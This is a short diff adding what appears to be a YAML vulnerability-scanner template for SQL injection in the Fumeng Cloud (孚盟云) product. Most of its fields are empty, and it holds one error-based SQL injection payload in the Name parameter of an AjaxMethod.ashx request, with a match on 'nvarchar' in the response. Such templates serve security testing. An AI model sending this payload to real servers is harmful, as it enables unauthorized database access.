@@ -1,0 +1,17 @@
+id:
+
+info:
+  name: 孚盟云 多处SQL注入漏洞
+  severity:
+  description:
+  details:
+  repair:
+requests1:
+  method: GET
+  path: /Ajax/AjaxMethod.ashx?action=getEmpByname&Name=1'+and+1=db_name()--+
+response1:
+  headers:
+  body: nvarchar
+  code:
+requests2:
+response2:
